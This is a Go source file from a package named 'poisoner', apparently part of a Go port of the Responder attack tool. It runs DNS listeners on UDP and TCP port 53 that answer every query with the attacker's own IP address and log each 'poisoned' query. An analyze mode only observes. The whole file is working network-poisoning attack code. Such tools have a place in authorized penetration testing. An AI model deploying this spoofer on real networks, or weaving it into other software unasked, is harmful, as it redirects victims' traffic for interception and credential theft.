package poisoner

import (
	"encoding/binary"
	"fmt"
	"net"

	"go-responder/internal/core"
)

func ServeDNS(ifaceIP net.IP) {
	conn, err := net.ListenPacket("udp4", fmt.Sprintf("%s:53", ifaceIP))
	if err != nil {
		core.LogError("DNS UDP listen :53 - %v (need root?)", err)
		return
	}
	core.LogInfo("DNS  listening on %s:53 (UDP+TCP)", ifaceIP)
	go serveDNSTCP(ifaceIP)

	buf := make([]byte, 512)
	for {
		n, src, err := conn.ReadFrom(buf)
		if err != nil {
			continue
		}
		pkt := make([]byte, n)
		copy(pkt, buf[:n])
		go HandleDNSQuery(conn, src, pkt, ifaceIP)
	}
}

func serveDNSTCP(ifaceIP net.IP) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:53", ifaceIP))
	if err != nil {
		return
	}
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go func(c net.Conn) {
			defer c.Close()
			lenBuf := make([]byte, 2)
			if _, err := readFull(c, lenBuf); err != nil {
				return
			}
			pktLen := int(binary.BigEndian.Uint16(lenBuf))
			pkt := make([]byte, pktLen)
			if _, err := readFull(c, pkt); err != nil {
				return
			}
			name := ParseLLMNRQuery(pkt)
			if name == "" {
				return
			}
			core.LogVerbose("DNS/TCP query: %s", name)
			if core.AnalyzeMode {
				core.LogInfo("[DNS] [Analyze] query for '%s'", name)
				return
			}
			resp := BuildDNSResponse(pkt, ifaceIP)
			if resp == nil {
				return
			}
			out := make([]byte, 2+len(resp))
			binary.BigEndian.PutUint16(out, uint16(len(resp)))
			copy(out[2:], resp)
			c.Write(out)
		}(c)
	}
}

func HandleDNSQuery(conn net.PacketConn, src net.Addr, pkt []byte, ip net.IP) {
	name := ParseLLMNRQuery(pkt)
	if name == "" {
		return
	}
	core.LogVerbose("DNS  query: %s from %s", name, src)
	if core.AnalyzeMode {
		core.LogInfo("[DNS] [Analyze] query for '%s' from %s", name, src)
		return
	}
	resp := BuildDNSResponse(pkt, ip)
	if resp != nil && conn != nil {
		conn.WriteTo(resp, src)
		core.LogInfo("[DNS] Poisoned query for '%s' - responding with %s", name, ip)
	}
}

func BuildDNSResponse(query []byte, ip net.IP) []byte {
	return BuildLLMNRResponse(query, ip)
}

func readFull(c net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := c.Read(buf[total:])
		total += n
		if err != nil {
			return total, err
		}
	}
	return total, nil
}
